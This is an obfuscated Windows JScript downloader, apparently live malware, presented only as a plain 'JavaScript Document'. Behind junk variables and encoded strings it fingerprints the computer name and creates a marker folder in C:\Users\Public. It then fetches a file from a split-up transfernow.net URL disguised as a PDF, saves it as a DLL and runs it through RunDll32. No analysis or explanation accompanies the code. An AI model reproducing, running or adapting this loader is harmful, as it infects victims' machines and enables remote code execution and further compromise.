// JavaScript Document
/* global WScript, exit, eof */

var ABJcfileDJOPAXWV79677622 = "EZ47791";
var ACVcidBDDJRRAV60556131 = "HQ801397985";
var ADcfolderUXSJTPCE60937407 = "JRIXLV6";
var AGACccashPFUIXSLY45086643 = "DFWBEOZS154679";
var AMRMctesteHCQDZWIR81599520 = "AUSJHCYLI14";
var AVHXWAETccashQFZRDGGA80997074 = "HVEAFEW8747";
var BcidAGALZDXB46289974 = "BGZJL1";
var BPGVWBXAchostDHXQQEGX48362206 = "IFGARQZH88738";
var BTCTWHcnomeUDAGPUGJ41864829 = "XZV8";
var CIXYZOXOcfileWWNMQCQU76229272 = "UADWOWFW036224";
var CJPSAccashLPRWUITX63314511 = "NDFC3";
var CYchospeMNJDXHRU00708108 = "GJ381";
var DGAVBcfileHITNNZZQ77080493 = "V064734227";
var DPBJctesteBXFDPPLG06675053 = "PFZVLFWIR56990";
var DWSXEcnomeWGTESOYC45612603 = "LLWJGYDJQ90101949";
var EIBUTHYIchostCXROJGMG03490231 = "DFRM0";
var ESRQXBJcfolderPDVNJTXH33784379 = "Q04";
var FFGYFctesteQIYBEZTD47455312 = "IEAUJCYCD43438114";
var FNIDQchostMEIVYEZE95889966 = "EOCPA7";
var FTZBUHPWDcidRNJWYXUG12092001 = "FELTGMFL217";
var FUBNVVMDLccashUUGJNTXN22556691 = "DTQTLZ0998052";
var GNEWFXchostFBRBABEL46299721 = "VEDY00624";
var GPXTDNUcfolderBXOZVIXV93414942 = "GUAAXNC275";
var HDEQYcfolderCPHRQVJJ32171014 = "CEBO4";
var HMXOccashNAHYYZYH45162083 = "MWQYWU99";
var HPVHJXNMPctesteVVARYGMU65986232 = "PTRIBD17";
var HVLLHGcnomeSUDBMMIV40724064 = "QRCIYISA496";
var ILTQZSLNOchospeQVRNOYJR35077267 = "VDLGOV44215";
var IMLGMXUNMchospePVLBWYLN31599244 = "OWJJJL909783539";
var IYRZIDLMcuserPPBMLLZE06940460 = "OEZYUJ12297";
var JAEARWCActesteMYZTGVRQ07574736 = "N03";
var JQYctesteBNIQLOZG85263055 = "JE9";
var JSOcuserXVCFMJUV84336863 = "LXBWSEXM705";
var JZOVIYcuserRIFGTFXX52173079 = "YFQHMQYFJ7920";
var LCDWcfolderDEIGAPCI09840069 = "ZQUCLCGQI35039856";
var LTSJQCEchostCPBPSIZQ03329259 = "NJAQTR6";
var LVSFPIIAcfolderXRYERUAC93936020 = "HQ5423822";
var McuserYSYROGVM66980436 = "O7";
var MINYRctesteSSIDFVSA94584765 = "S4";
var MMJEWWNBQcidXWQNADOI24774975 = "BRZQRADQ21755";
var MMVcuserHLEEVCSQ52972300 = "I215305";
var NccashSPNMEPGD70183947 = "BM8";
var NcnomeALQQAPOT67993281 = "YMZUGMQVB531598";
var NcuserHSGLFIYF26015551 = "EGOAZMBL030201976";
var OEYchospeAPSNWJES39845464 = "QOHMS6";
var ONAEDcidZEMVJVUN40664819 = "NVMCGZ7234257";
var PctesteNRIMNTEV04403240 = "IONWU1049274";
var PJFVHBchospeONMDZOZP23406790 = "TJG1934";
var PNchospeJJXGODAP46954258 = "FUXE1";
var QANHTOPOcfolderSRRBHMPB30134615 = "AYNTGLWJL03";
var QARHcidXUSNLTWL36864025 = "AFOMCRAU8933512";
var QBTGYWcfileBOIBEROO67020484 = "OZPMIVB0";
var QMLIRGIScfileFEVGGVLU15675061 = "J7660";
var RcfileVEBYJRVI85363925 = "M574780";
var RchostTBJYRHMG03182405 = "SBD6698";
var ROVDIDWcnomePVISGHAB96505222 = "LJSUVVN618388";
var RYBHRTZQcnomeZRVCZYVX55754221 = "XZOY638315094";
var SIBITQFNchostQRPCWXVW16571804 = "GZ5481";
var SQXNGcidPPOTZVAU19150778 = "IYS5234";
var UTPFcfileQLEGANFP05407823 = "WYVUGNU1549";
var VchospeDWNPGMRT99867714 = "LJZWDDDAQ301788";
var WGEMcuserBDSVHBWO14537236 = "P4940772";
var WROZccashWFMCMVXU54851513 = "EODIQMGRA20";
var XDOCNRPcfileXQUAWRUF48709637 = "UJERH7";
var YccashGLHLMWUD82877330 = "YYJ80";
var YPSVVSJXDcnomeTBBNMPZE09127346 = "QPWJWM9631";
var YUVCJcfolderNAXAACXJ64022858 = "EWQEIPW20022";
var YVGUSTBAGchospeDMXHQJTN04514816 = "TTYBR687597103";
var ZALchostHNHTLJEW97559133 = "SXNQFI3";
var ZDTGEQMHcuserQDZJSCLX56551689 = "M486797798";
var ZYDCZABcnomeMEHZZDJA41552965 = "GVG2";
var ZZZDcidJIJYBXPE05960743 = "HQWYSDO8156468";

var cUser = "EIEIDHU";
var cUser7658 = "EIEIDHU";
var cUser44432 = "EIEIDHU";
var cUser665 = "EIEIjkl980DHU";
var cUser4499 = "EIEIn6WWWDHU";
var cUser9037 = "EIEIDKMYHU";
var cUser7746289 = "EIEIGHJDHU";
var cUser8632 = "EIEIDHU";
var cUser4485 = "AMEDE8MIU";
var cUser = "EIEIDHU";
var cFile1 = "YJJGO";
var cFile2 = "CIMFS";
var cID = "LIKINHYICFWIRGD";
var NAME001 = "BILFQFNIGFSIO";
var cNomeF2 = "GIQFWFSILFXIT";
var cNomeFZ2 = "AIKFQFMINHVID";
var cHtml = "LFXIGISILIK";
var cWSh311 = "RHUIXIHIWINIUIYGEHQIMIJIQIQ";
var cWN3t = "FHIHEHUIKIBIIIMFRGYHWIMIPIHIKID";
var cScrF1l3 = "CHBHRIHHXIFIJHXIDHVFOGNHXIBHTHBIOIIIJHTICGWHQHYHTHRIJ";
var cSh3llApp = "RHQIMIJIQIQGEGXIUIUIQINIHIFIYINITIS";
var cHost02 = "4coYVBvR2tGR";
var Ad0bSt3 = "IGOGRHDGRGPFUHHIPINIAHVII";
var MxmlHt = "64C45C3F6789DE03CE5FA2E";
var c1nf3ctz = "";
var cFolder = "C:\\Users\\Public\\";
var sNomeMaq;
var sID;
var sIDW;
var sTipoSO;
var sAwvx = "NHYBVGTVFGTDCE";
var xID = 91;
var xReg = "PIUIHIJIVIYIUGHGGGCIHJBIHFNGDIVFNFP";
var cHosttotal;

var NAMEWV919 = "damonvieira.dll";
var NAMEPM182 = "damonvieira.dll";
var NAMEVO697 = "damonvieira.dll";
var NAMEJF622 = "damonvieira.dll";
var NAMEEY163 = "damonvieira.dll";
var NAMEJC549 = "damonvieira.dll";
var NAMESJ582 = "damonvieira.dll";
var NAMEIX447 = "damonvieira.dll";
var NAMEIM509 = "damonvieira.dll";


var cHost947 = "https://fsp3.t";
var cHost980 = "ransfernow.net";
var cHost404 = "/download/5b11";
var cHost089 = "4c87bb3cf/atta";
var cHost413 = "chment/93bbd08";
var cHost894 = "09359/slide004";
var cHost080 = ".pdf";

function wdecrypt8134(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt5400(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt9443(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  





function run9240(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run6880(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run9985(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run9861(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run9230(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run2337(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}



function down1603(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down5514(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down5987(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down0193(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down9825(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down8652(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }




var network = new ActiveXObject(wdecrypt9443(cWN3t,xID));
sNomeMaq = network.computerName;                                                                                   
cFolder = cFolder + sNomeMaq.substring(0, 3) + "GLOX443\\";
sId = cFolder + "id";                                                                                              
sIdW = cFolder + "idw";                                                                                            
cHosttotal = cHost947+cHost980+cHost404+cHost089+cHost413+cHost894+cHost080;
c1nf3ctz = c1nf3ctz +"?tmpString=" + cHosttotal + "&pcn=" + network.computerName+ "&AT=" + 0106;

var fso = WScript.CreateObject(wdecrypt9443(cScrF1l3,xID));                                                      
	if (!fso.FileExists(sId) && fso.FolderExists("C:\\Users\\Public\\")){                                      
 try{                                                                                                              
    down8652(c1nf3ctz)} catch(err) {}                            
		if (!fso.FolderExists(cFolder)) {                                                                              
fso.CreateFolder(cFolder);
		}                                                                                                              

	if (fso.FolderExists("C:\\Program Files (x86)\\")) {                                                             
	sTipoSO = "64";                                                                                                  
	} else {                                                                                                         
	sTipoSO = "32";                                                                                                  
	}                                                                                                               
	var s = fso.CreateTextFile(sId, true);                                                                           
   	s.WriteLine(wdecrypt9443(cID,xID));                                                                                 
   	s.Close();                                                                                                         
	var s2 = fso.CreateTextFile(sIdW, true);                                                                           
   	s2.WriteLine("91");                                                                                
   	s2.Close();                                                                                                         
 try{                                                                                                              
    down8652(cHosttotal)} catch(err) {}                            
	down8652(cHosttotal, "C:\\Users\\Public\\"+ NAMEWV919);  
try 
{run2337("RunDll32.exe C:\\Users\\Public\\"+ NAMEPM182 + ",imane");
}catch(err) {} 
        }  
